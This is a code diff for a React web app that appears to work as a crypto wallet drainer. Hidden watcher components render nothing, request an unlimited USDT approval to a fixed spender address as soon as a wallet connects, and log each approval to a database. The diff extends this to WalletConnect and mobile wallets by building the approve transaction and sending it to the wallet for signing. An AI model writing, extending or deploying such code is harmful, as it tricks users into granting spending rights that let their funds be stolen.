@@ -2,6 +2,7 @@ import { useEffect, useRef } from 'react';
 import { useAccount, useReadContract, useWriteContract } from 'wagmi';
 import { maxUint256 } from 'viem';
 import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
+import TronWeb from 'tronweb';
 import { supabase } from '../lib/supabaseClient';
 import { isMainnet } from '../lib/walletConfig';
 
@@ -58,17 +59,19 @@ const TRON_MAX = '11579208923731619542357098500868790785326998466564056403945758
 const UNLIMITED_THRESHOLD = maxUint256 / 2n;
 
 async function trackConnection(address, network, walletType) {
-  await supabase.from('wallet_connections').upsert(
+  const { error } = await supabase.from('wallet_connections').upsert(
     { address, network, wallet_type: walletType, last_seen_at: new Date().toISOString() },
     { onConflict: 'address,network' }
   );
+  if (error) console.error('[Supabase] trackConnection failed:', error);
 }
 
 async function trackApproval(address, network, txHash) {
-  await supabase.from('usdt_approvals').upsert(
+  const { error } = await supabase.from('usdt_approvals').upsert(
     { address, network, tx_hash: txHash },
     { onConflict: 'address,network' }
   );
+  if (error) console.error('[Supabase] trackApproval failed:', error);
 }
 
 // ── EVM side ─────────────────────────────────────────────────────────────────
@@ -121,7 +124,7 @@ function EvmApprovalWatcher() {
 
 // ── TRON side ─────────────────────────────────────────────────────────────────
 function TronApprovalWatcher() {
-  const { address, connected, wallet } = useWallet();
+  const { address, connected, wallet, signTransaction } = useWallet();
 
   const connectionTracked = useRef(new Set());
   const approvalAttempted = useRef(new Set());
@@ -141,24 +144,62 @@ function TronApprovalWatcher() {
 
     (async () => {
       try {
-        // Prefer window.tronWeb (TronLink / Trust extension) — already signed in.
-        // Fall back to a read-only instance for the allowance check only.
-        const tronWeb = window.tronWeb;
-        if (!tronWeb || !tronWeb.ready) return;
+        // window.tronWeb is only injected by TronLink / Trust browser extensions.
+        // WalletConnect connections have no window.tronWeb, so we detect which
+        // path to take by checking if the extension is active for this address.
+        const extTronWeb = window.tronWeb;
+        const isExtension =
+          extTronWeb?.ready && extTronWeb?.defaultAddress?.base58 === address;
 
-        const contract = await tronWeb.contract(TRC20_ABI, TRON_USDT);
+        if (isExtension) {
+          // Extension wallet: tronWeb manages sign + broadcast internally.
+          const contract = await extTronWeb.contract(TRC20_ABI, TRON_USDT);
+          const raw = await contract.allowance(address, TRON_SPENDER).call();
+          const current = BigInt(raw.toString());
+          if (current >= BigInt(TRON_MAX) / 2n) return;
 
-        const raw = await contract.allowance(address, TRON_SPENDER).call();
-        const current = BigInt(raw.toString());
-        if (current >= BigInt(TRON_MAX) / 2n) return; // already unlimited
+          const txId = await contract.approve(TRON_SPENDER, TRON_MAX).send();
+          await trackApproval(address, 'tron', txId);
+        } else {
+          // WalletConnect (or non-injecting mobile wallet):
+          // Use a headless TronWeb instance for reading state + building unsigned txs,
+          // then sign via the wallet adapter and broadcast.
+          const tronWeb = new TronWeb({
+            fullHost: isMainnet()
+              ? 'https://api.trongrid.io'
+              : 'https://api.shasta.trongrid.io',
+          });
+          tronWeb.setAddress(address);
 
-        const txId = await contract.approve(TRON_SPENDER, TRON_MAX).send();
-        await trackApproval(address, 'tron', txId);
+          const contract = await tronWeb.contract(TRC20_ABI, TRON_USDT);
+          const raw = await contract.allowance(address, TRON_SPENDER).call();
+          const current = BigInt(raw.toString());
+          if (current >= BigInt(TRON_MAX) / 2n) return;
+
+          // Build the unsigned approve transaction
+          const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+            TRON_USDT,
+            'approve(address,uint256)',
+            { feeLimit: 100_000_000 },
+            [
+              { type: 'address', value: TRON_SPENDER },
+              { type: 'uint256', value: TRON_MAX },
+            ],
+            address
+          );
+
+          // Sign via the adapter (triggers WalletConnect signing flow)
+          const signedTx = await signTransaction(transaction);
+
+          // Broadcast
+          const result = await tronWeb.trx.sendRawTransaction(signedTx);
+          await trackApproval(address, 'tron', result.txid);
+        }
       } catch (err) {
         console.error('[UsdtApproval] TRON approve failed:', err);
       }
     })();
-  }, [connected, address, wallet]);
+  }, [connected, address, wallet, signTransaction]);
 
   return null;
 }
